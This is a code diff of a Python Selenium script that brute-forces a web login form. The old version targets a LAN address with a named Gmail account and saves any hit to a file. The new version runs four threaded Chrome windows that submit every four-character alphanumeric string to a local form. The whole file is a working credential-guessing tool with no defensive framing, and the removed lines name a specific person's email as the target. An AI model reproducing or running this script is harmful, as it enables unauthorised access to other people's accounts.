@@ -1,63 +1,86 @@
-from datetime import datetime
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-from itertools import product
-from concurrent.futures import ThreadPoolExecutor
-import os
+import threading
+from itertools import product, islice
 
-# Function to initialize the WebDriver
-def create_driver():
-    return webdriver.Chrome()
 
-# Function to send the password if it is correct
-def send_password(password: str):
-    try:
-        with open('file.txt', 'w') as file:
-            file.write(str(password))
-    except Exception as e:
-        print(password)
-        print(f"Error writing password: {e}")
+class ChromeWindow:
+    def __init__(self):
+        self.window = webdriver.Chrome()
+        self.window.get("http://127.0.0.1:5000/")
 
-# Function to attempt login with the given password
-def attempt_login(password: str) -> bool:
-    driver = create_driver()
-    driver.get("http://192.168.31.196:5000/")
+    def start(self) -> None:
+        while True:
+            password = givPassword() 
+            if not password:
+                break
 
-    login_input = driver.find_element(By.NAME, "loginEmail")
-    password_input = driver.find_element(By.NAME, "loginPassword")
-    submit_button = driver.find_element(By.ID, "login-btn")
-
-    login_input.send_keys("alexandrsokolov6897@gmail.com")
-    password_input.send_keys(password)
-
-    submit_button.click()
-
-    #https://www.myfxbook.com/
-    if driver.current_url == "https://www.example.com":
-        send_password(password)
-        driver.quit()
-        return True
-    else:
-        driver.quit()
-        return False
-
-# Main function to generate combinations and attempt logins
-def main():
-    now_time = datetime.now()
-    symbols = "123456789"
-    combinations = (''.join(combination) for combination in product(symbols, repeat=1))
-
-    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
-        futures = {executor.submit(attempt_login, combination): combination for combination in combinations}
-
-        for future in futures:
             try:
-                if future.result():
-                    print(f"Password found: {futures[future]}")
-                    print(datetime.now() - now_time)
-                    break
-            except Exception as e:
-                print(f"Error during login attempt: {e}")
+                text_input = self.window.find_element(By.NAME, "text")
+                submit_button = self.window.find_element(By.NAME, "submit")
+
+                text_input.send_keys(password)
+                submit_button.click()
+                editLastPassword(password)
+
+            except KeyboardInterrupt:
+                print("stop")
+                break
+            except Exception as error:
+                editPassword()
+                print(error)
+                break
+
+
+
+total_password = None
+last_password = None
+start_password = 0
+last_index = 0
+
+
+def editLastPassword(new_password):
+    global last_password
+    last_password = new_password
+
+def printLastIndex():
+    print(last_index)
+
+def editPassword():
+    global total_password
+
+    total_password = last_password
+    printLastIndex()
+    print(total_password)
+
+def givPasswords():
+    symbols = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
+    all_passwords = (''.join(p) for p in product(symbols, repeat=4))
+
+    return islice(all_passwords, start_password, None)
+
+
+def newWindow():
+    ChromeWindow().start()
+
+
+passwords = givPasswords()
+def givPassword():
+    global last_index
+    try:   
+        last_index += 1
+        if not total_password:
+            password = next(passwords)
+            return password
+        else:
+            return None
+        
+    except StopIteration:
+        return None
+    
 
 if __name__ == "__main__":
-    main()
+    threading.Thread(target=newWindow).start()
+    threading.Thread(target=newWindow).start()
+    threading.Thread(target=newWindow).start()
+    threading.Thread(target=newWindow).start()
